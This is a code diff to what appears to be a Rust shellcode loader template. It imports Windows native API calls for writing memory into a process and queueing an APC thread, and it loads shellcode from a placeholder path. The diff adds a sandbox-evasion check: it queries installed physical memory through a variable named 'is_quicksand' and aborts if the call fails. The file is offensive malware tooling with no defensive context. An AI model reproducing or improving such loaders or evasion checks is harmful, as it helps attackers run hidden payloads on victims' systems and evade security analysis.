@@ -19,6 +19,8 @@ use ntapi::ntmmapi::NtWriteVirtualMemory;
 use ntapi::ntmmapi::NtProtectVirtualMemory;
 use ntapi::ntpsapi::NtQueueApcThread;
 use ntapi::ntpsapi::NtTestAlert;
+use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
+
 
 use std::include_bytes;
 {{IMPORTS}}
@@ -60,6 +62,16 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
+    
+    let mut memory = 0;
+    unsafe {
+        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
+        println!("{:#?}", is_quicksand);
+        if is_quicksand != 1 {
+            panic!("Hello.")
+        }
+    }
+
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
